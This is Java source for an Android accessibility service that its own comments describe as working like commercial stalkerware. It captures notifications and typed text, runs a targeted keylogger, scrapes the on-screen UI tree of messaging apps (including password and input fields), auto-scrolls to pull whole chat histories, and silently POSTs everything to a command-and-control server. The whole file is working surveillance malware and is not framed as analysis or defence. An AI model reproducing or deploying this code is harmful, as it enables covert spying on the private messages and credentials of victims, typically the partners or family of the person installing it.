package com.warden.agent;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Notification + text capture (passive) AND active UI-tree scraping.
 *
 * This is how commercial stalkerware reads WhatsApp/Facebook/Instagram without
 * root: it never touches the encrypted app database — it walks the rendered
 * accessibility node tree of whatever is on screen (chat names, messages,
 * input fields) and optionally scrolls to capture page after page.
 */
public class AccessibilityLogger extends AccessibilityService {

    /** Live service instance — lets CommandHandler trigger active scrapes. */
    public static volatile AccessibilityLogger instance;

    /** Targeted keylog: package name + expiry (epoch ms). Null/0 = off. */
    public static volatile String keylogTarget = null;
    public static volatile long keylogUntil = 0;

    private Prefs prefs;
    private long lastSent = 0;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        prefs = new Prefs(this);
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    // ---------- passive capture ----------

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event == null || event.getPackageName() == null) return;
            String pkg = event.getPackageName().toString();
            int t = event.getEventType();

            boolean targeted = keylogTarget != null
                    && pkg.equals(keylogTarget)
                    && System.currentTimeMillis() < keylogUntil;

            boolean interesting = t == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
                    || t == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    || t == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
                    || t == AccessibilityEvent.TYPE_VIEW_FOCUSED
                    || t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    || t == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;

            if (!interesting) return;

            // passive mode: 2s throttle. targeted mode: no throttle, everything.
            if (!targeted && System.currentTimeMillis() - lastSent < 2000) return;
            lastSent = System.currentTimeMillis();

            StringBuilder text = new StringBuilder();
            if (event.getText() != null) {
                for (CharSequence cs : event.getText()) {
                    if (cs != null) text.append(cs).append(" ");
                }
            }
            if (text.length() == 0 && !targeted) return;

            JSONObject j = new JSONObject();
            j.put("agent_id", prefs != null ? prefs.agentId() : "");
            j.put("type", targeted ? "keylog" :
                    (t == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED ? "notification" : "text"));
            j.put("pkg", pkg);
            j.put("text", text.toString().trim());
            j.put("time", System.currentTimeMillis());
            post(j.toString());
        } catch (Exception ignored) {}
    }

    // ---------- active scraping ----------

    /**
     * Walk the current foreground window's node tree, optionally scrolling.
     * Returns a text dump: every visible string, view id and input field.
     */
    public static String scrapeActive(String expectPkg, int scrolls) {
        AccessibilityLogger svc = instance;
        if (svc == null) return "error: accessibility service not enabled";

        StringBuilder out = new StringBuilder();
        AccessibilityNodeInfo lastRoot = null;
        for (int page = 0; page <= scrolls; page++) {
            AccessibilityNodeInfo root = svc.getRootInActiveWindow();
            if (root == null) {
                out.append("=== page ").append(page).append(": no window\n");
                break;
            }
            String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "?";
            out.append("=== page ").append(page).append(" pkg=").append(pkg).append("\n");
            walk(root, out, 0);
            lastRoot = root;

            if (page < scrolls) {
                boolean scrolled = scrollForward(root);
                if (!scrolled) break;
                try { Thread.sleep(1800); } catch (InterruptedException ignored) {}
            }
        }
        if (lastRoot != null) lastRoot.recycle();
        String result = out.toString();
        if (result.trim().isEmpty()) return "empty screen (wrong package or app not foreground)";
        return result;
    }

    private static void walk(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null) return;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String id = node.getViewIdResourceName();

            if (text != null && text.length() > 0) {
                sb.append("T|").append(depth).append("| ").append(text).append("\n");
            }
            if (desc != null && desc.length() > 0) {
                sb.append("D|").append(depth).append("| ").append(desc).append("\n");
            }
            if (id != null) {
                sb.append("ID|").append(depth).append("| ").append(id);
                if (node.isEditable()) sb.append(" [editable]");
                if (node.isPassword()) sb.append(" [password]");
                sb.append("\n");
            }
            if (node.isEditable() && text != null && text.length() > 0) {
                sb.append("INPUT|").append(depth).append("| ").append(text).append("\n");
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    walk(child, sb, depth + 1);
                }
            }
        } catch (Exception ignored) {}
    }

    private static boolean scrollForward(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            if (node.isScrollable()) {
                return node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null && scrollForward(child)) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    /** True if the accessibility service is running. */
    public static boolean isEnabled() {
        return instance != null;
    }

    private void post(String body) {
        new Thread(new Runnable() {
            @Override public void run() {
                try {
                    HttpURLConnection c = (HttpURLConnection) new URL(
                            (prefs != null ? prefs.c2() : "http://10.0.2.2:8000") + "/api/event").openConnection();
                    c.setRequestMethod("POST");
                    c.setDoOutput(true);
                    c.setRequestProperty("Content-Type", "application/json");
                    c.setConnectTimeout(8000);
                    c.setReadTimeout(8000);
                    OutputStream os = c.getOutputStream();
                    os.write(body.getBytes("UTF-8"));
                    os.close();
                    c.getResponseCode();
                    c.disconnect();
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @Override
    public void onInterrupt() {}
}
